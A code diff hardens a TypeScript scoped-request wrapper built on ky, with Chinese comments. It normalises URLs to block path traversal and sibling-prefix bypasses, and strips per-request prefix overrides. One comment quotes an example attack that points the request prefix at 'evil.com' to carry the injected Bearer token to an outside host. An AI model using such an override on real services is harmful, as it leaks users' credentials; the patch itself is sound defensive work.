@@ -30,7 +30,18 @@ export function createScopedRequest(
 				+ "ctx.register.apiPrefix(\"/your-prefix\") 再发起请求。",
 			);
 		}
-		if (!rawUrl.startsWith(prefix)) {
+		// P7.2：先经 URL 归一化（折叠 ../ 与反斜杠），再按路径段边界匹配——
+		// 裸 startsWith 会放行兄弟前缀（/sys → /sysadmin）与路径穿越
+		// （/sys/../admin 折叠后越界）。
+		let pathname: string;
+		try {
+			pathname = new URL(rawUrl, "http://scoped.local").pathname;
+		}
+		catch {
+			pathname = rawUrl;
+		}
+		const boundary = prefix.endsWith("/") ? prefix.slice(0, -1) : prefix;
+		if (pathname !== boundary && !pathname.startsWith(`${boundary}/`)) {
 			throw new Error(
 				`[module] 模块 "${moduleName}" 请求越界：${rawUrl} 不在其登记前缀 ${prefix} 内。`
 				+ "请调整接口路径，或登记正确前缀（D11 安全收敛）。",
@@ -38,15 +49,27 @@ export function createScopedRequest(
 		}
 	}
 
+	/**
+	 * P7.2：剥离逐请求 prefix/prefixUrl——ky 2.x 允许逐请求覆盖默认 prefix，
+	 * 否则 `scoped.get("sys/x", { prefix: "https://evil.com" })` 会带着
+	 * beforeRequest 注入的 Bearer token 打到任意外域（凭据外泄）。
+	 */
+	function sanitize(options?: Options): Options | undefined {
+		if (!options)
+			return options;
+		const { prefix: _prefix, prefixUrl: _prefixUrl, ...rest } = options as Options & { prefixUrl?: string };
+		return rest;
+	}
+
 	const scoped = ((url: string | URL, options?: Options) => {
 		guard(String(url));
-		return underlying(url as string, options);
+		return underlying(url as string, sanitize(options));
 	}) as GlobalRequest;
 
 	for (const method of ["get", "post", "put", "patch", "delete", "head"] as const) {
 		scoped[method] = ((url: string | URL, options?: Options) => {
 			guard(String(url));
-			return underlying[method](url as string, options);
+			return underlying[method](url as string, sanitize(options));
 		}) as GlobalRequest[typeof method];
 	}
 
